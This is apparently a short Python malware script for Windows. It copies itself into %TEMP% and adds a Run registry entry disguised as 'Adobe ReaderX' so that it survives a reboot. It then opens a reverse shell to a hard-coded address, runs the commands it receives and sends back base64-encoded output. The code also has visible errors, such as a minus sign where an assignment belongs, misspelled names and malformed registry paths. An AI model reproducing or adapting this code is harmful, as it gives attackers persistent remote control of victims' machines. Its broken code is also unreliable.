import sys, base64, os, socket, subprocess
from _winreg import *

def autorun(tempdir, file_name, run):
    #copy the .exe to the %TEMP%
    os.system('copy %s %s'%(file_name, tempdir))

    #queries windows registry for the autorun key value
    #store the key values in runkey array
    key - OpenKey(HKEY_LOCAL_MACHINE,run)
    runkey=[]
    try:
        i=0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i+=1
    except (WindowsError) as err:
        print(err)
        pass

        #if the autorun key "Adobe ReaderX" isn't set this will et the key

    if 'Adobe ReaderX' not in runkey:
        try:
            key=OpenKey(HKEY_LOCAL_MACHINE,run,0,KEY_ALL_ACCESS)
            SetValueEx(key,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%mw.exe")
            key.Close()
        except (Windowserror) as err:
            print(err)
            pass
def shell():
    #Base64 encoded reverse shell
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = connect(('192.168.0.13', int(443)))
    s.send('[*] CONNECTIOIN ESTABLISHED O/')
    while 1:
        data = s.recv(1024)
        if data =='quit': break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        encoded = base64.b64encoded(stdout_value)
        s.send(encoded)
        #s.send(stdout_value)
    s.close()

def main():
    tempdir="%TEMP%"
    file_name = sys.argv[0]
    run = 'SoftwareMicrosoftWindowsCurrentVersionRun'
    autorun(tempdir, file_name, run)
    shell()

if __name__ == "__main__":
    main()

